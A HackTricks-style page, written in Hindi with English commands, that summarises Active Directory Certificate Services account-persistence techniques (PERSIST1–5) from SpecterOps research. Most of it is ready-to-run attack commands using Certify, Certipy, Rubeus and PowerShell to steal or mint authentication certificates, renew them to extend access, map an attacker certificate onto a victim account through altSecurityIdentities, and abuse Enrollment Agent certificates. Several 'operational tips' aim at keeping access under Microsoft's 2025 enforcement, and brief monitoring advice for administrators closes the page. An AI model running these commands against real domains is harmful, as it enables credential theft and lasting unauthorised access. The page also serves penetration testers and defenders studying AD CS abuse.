# AD CS खाता स्थायित्व

{{#include ../../../banners/hacktricks-training.md}}

**यह [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf) से शानदार रिसर्च के खाता स्थायित्व अध्यायों का एक छोटा सारांश है**

## Active User Credential Theft with Certificates – PERSIST1 को समझना

ऐसी स्थिति में जहाँ कोई certificate जो domain authentication की अनुमति देता है, किसी user द्वारा अनुरोध किया जा सकता है, एक attacker इस certificate को अनुरोध करके और चुरा कर नेटवर्क पर persistence बनाए रखने का अवसर प्राप्त कर लेता है। डिफ़ॉल्ट रूप से, `User` template Active Directory में ऐसे अनुरोधों की अनुमति देता है, हालांकि कभी-कभी यह निष्क्रिय हो सकता है।

Using [Certify](https://github.com/GhostPack/Certify) or [Certipy](https://github.com/ly4k/Certipy), आप client authentication की अनुमति देने वाले सक्षम templates को खोज सकते हैं और फिर उनमें से एक के लिए अनुरोध कर सकते हैं:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
एक प्रमाणपत्र की शक्ति इस बात में है कि जब तक प्रमाणपत्र वैध है, यह उस उपयोगकर्ता के रूप में प्रमाणीकरण (authenticate) कर सकता है जिसके लिए यह जारी किया गया है, भले ही पासवर्ड बदल जाए।

आप PEM को PFX में कनवर्ट कर सकते हैं और इसे एक TGT प्राप्त करने के लिए उपयोग कर सकते हैं:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> नोट: अन्य तकनीकों (देखें THEFT sections) के साथ मिलाकर, certificate-based auth बिना LSASS को छुए और यहां तक कि non-elevated contexts से भी persistent access की अनुमति देता है।

## Certificates के साथ Machine Persistence प्राप्त करना - PERSIST2

यदि किसी हमलावर के पास किसी होस्ट पर elevated privileges हैं, तो वे compromised सिस्टम के machine account के लिए डिफ़ॉल्ट `Machine` template का उपयोग करके एक certificate enroll कर सकते हैं। मशीन के रूप में authenticate करने से local services के लिए S4U2Self सक्षम होता है और यह टिकाऊ host persistence प्रदान कर सकता है:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Certificate Renewal के माध्यम से Persistence बढ़ाना - PERSIST3

certificate templates की validity और renewal periods का दुरुपयोग एक हमलावर को दीर्घकालिक एक्सेस बनाए रखने की अनुमति देता है। यदि आपके पास पहले से जारी किया गया प्रमाणपत्र और उसकी private key है, तो आप समाप्ति से पहले उसे renew करके बिना मूल principal से जुड़े अतिरिक्त request artifacts छोड़े एक नया, लंबे समय तक मान्य credential प्राप्त कर सकते हैं।
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> परिचालन सुझाव: हमलावर के पास रखी PFX फ़ाइलों की अवधि ट्रैक करें और समय से पहले नवीनीकरण करें। नवीनीकरण से अद्यतन प्रमाणपत्रों में आधुनिक SID mapping एक्सटेंशन शामिल हो सकता है, जिससे वे कड़े DC mapping नियमों के तहत भी उपयोगी बने रहते हैं (अगले अनुभाग देखें)।

## स्पष्ट प्रमाणपत्र मैपिंग (altSecurityIdentities) – PERSIST4

यदि आप लक्षित खाते के `altSecurityIdentities` attribute में लिख सकते हैं, तो आप एक हमलावर-नियंत्रित प्रमाणपत्र को स्पष्ट रूप से उस खाते से मैप कर सकते हैं। यह पासवर्ड परिवर्तनों के बाद भी स्थायी रहता है और मजबूत मैपिंग फॉर्मैट्स का उपयोग करने पर आधुनिक DC प्रवर्तन के तहत भी कार्यशील रहता है।

High-level flow:

1. Obtain or issue a client-auth certificate you control (e.g., enroll `User` template as yourself).
2. Extract a strong identifier from the cert (Issuer+Serial, SKI, or SHA1-PublicKey).
3. Add an explicit mapping on the victim principal’s `altSecurityIdentities` using that identifier.
4. Authenticate with your certificate; the DC maps it to the victim via the explicit mapping.

Example (PowerShell) using a strong Issuer+Serial mapping:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
फिर अपने PFX के साथ authenticate करें। Certipy सीधे एक TGT प्राप्त करेगा:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### मजबूत `altSecurityIdentities` मैपिंग्स बनाना

व्यवहार में, **Issuer+Serial** और **SKI** मैपिंग्स attacker-held certificate से बनाने के लिए सबसे आसान मजबूत प्रारूप होते हैं। यह **February 11, 2025** के बाद मायने रखता है, जब DCs डिफ़ॉल्ट रूप से **Full Enforcement** पर आ जाएंगे और कमजोर मैपिंग्स भरोसेमंद होना बंद कर देंगी।
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
नोट्स
- केवल मजबूत मैपिंग प्रकारों का उपयोग करें: `X509IssuerSerialNumber`, `X509SKI`, या `X509SHA1PublicKey`. कमजोर फॉर्मैट्स (Subject/Issuer, Subject-only, RFC822 email) अप्रचलित हैं और DC नीति द्वारा ब्लॉक किए जा सकते हैं।
- यह मैपिंग दोनों **user** और **computer** ऑब्जेक्ट्स पर काम करती है, इसलिए किसी computer खाते की `altSecurityIdentities` पर write access उस मशीन के रूप में बने रहने के लिए पर्याप्त है।
- cert chain को ऐसे root तक build होना चाहिए जिसे DC भरोसा करता हो। NTAuth में Enterprise CAs सामान्यतः trusted होते हैं; कुछ वातावरण public CAs पर भी भरोसा करते हैं।
- Schannel authentication persistence के लिए तब भी उपयोगी रहती है जब PKINIT fail कर जाता है क्योंकि DC के पास Smart Card Logon EKU नहीं होता या वह `KDC_ERR_PADATA_TYPE_NOSUPP` लौटाता है।

कमजोर explicit mappings और attack paths के बारे में अधिक जानकारी के लिए देखें:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

यदि आप एक वैध Certificate Request Agent/Enrollment Agent certificate प्राप्त कर लेते हैं, तो आप users की ओर से इच्छानुसार नए logon-capable certificates जारी कर सकते हैं और agent PFX को persistence token के रूप में ऑफ़लाइन रख सकते हैं। Abuse workflow:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Revocation of the agent certificate or template permissions is required to evict this persistence.

ऑपरेशनल नोट्स
- आधुनिक `Certipy` वर्शन दोनों `-on-behalf-of` और `-renew` का समर्थन करते हैं, इसलिए एक हमलावर जिसके पास Enrollment Agent PFX है, वह मूल लक्षित खाते को फिर से टच किए बिना leaf certificates बना और बाद में नवीनीकृत कर सकता है।
- यदि PKINIT-आधारित TGT retrieval संभव नहीं है, तो प्राप्त on-behalf-of certificate Schannel authentication के लिए अभी भी उपयोगी रहता है, उदाहरण: `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.

## 2025 Strong Certificate Mapping Enforcement: पर्सिस्टेंस पर प्रभाव

Microsoft KB5014754 ने domain controllers पर Strong Certificate Mapping Enforcement पेश किया। 11 फरवरी, 2025 से DCs डिफ़ॉल्ट रूप से Full Enforcement पर हैं, जो कमजोर/अस्पष्ट mappings को अस्वीकार करते हैं। व्यावहारिक निहितार्थ:

- 2022 से पहले के certificates जिनमें SID mapping extension नहीं है, Full Enforcement पर होने पर implicit mapping में विफल हो सकते हैं। हमलावर पहुँच बनाए रख सकते हैं या तो AD CS के माध्यम से certificates को नवीनीकृत करके (SID extension प्राप्त करने के लिए) या `altSecurityIdentities` में एक मजबूत explicit mapping (PERSIST4) लगाकर।
- मजबूत फॉर्मैट्स (Issuer+Serial, SKI, SHA1-PublicKey) का उपयोग करने वाले explicit mappings काम जारी रखते हैं। कमजोर फॉर्मैट्स (Issuer/Subject, Subject-only, RFC822) को ब्लॉक किया जा सकता है और पर्सिस्टेंस के लिए इन्हें टाला जाना चाहिए।

प्रशासकों को निगरानी और अलर्टिंग करनी चाहिए:
- `altSecurityIdentities` में बदलाव और Enrollment Agent तथा User certificates के जारी/नवीनीकरण पर।
- on-behalf-of अनुरोधों और असामान्य नवीनीकरण पैटर्न के लिए CA issuance लॉग्स पर।

## संदर्भ

- Microsoft. KB5014754: Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- SpecterOps. ADCS ESC14 Abuse Technique (explicit `altSecurityIdentities` abuse on user/computer objects).
https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/
- Certipy Wiki – Command Reference (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- Almond Offensive Security. Authenticating with certificates when PKINIT is not supported.
https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

{{#include ../../../banners/hacktricks-training.md}}
